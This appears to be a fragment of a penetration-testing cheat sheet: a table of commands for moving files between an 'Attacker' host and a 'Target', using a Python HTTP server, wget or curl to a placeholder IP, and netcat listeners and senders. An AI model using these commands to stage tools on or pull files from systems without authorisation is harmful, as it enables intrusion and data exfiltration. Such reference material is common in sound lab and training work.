| **Action**          | **Command**                                                        |
| ------------------- | ------------------------------------------------------------------ |
| **Host (Attacker)** | `python3 -m http.server 80`                                        |
| **Fetch (Target)**  | `wget http://[IP]/file` or `curl [IP]/file -o file`                |
| **NC Push**         | `nc -lvnp 4444 > file` (Receiver) / `nc [IP] 4444 < file` (Sender) |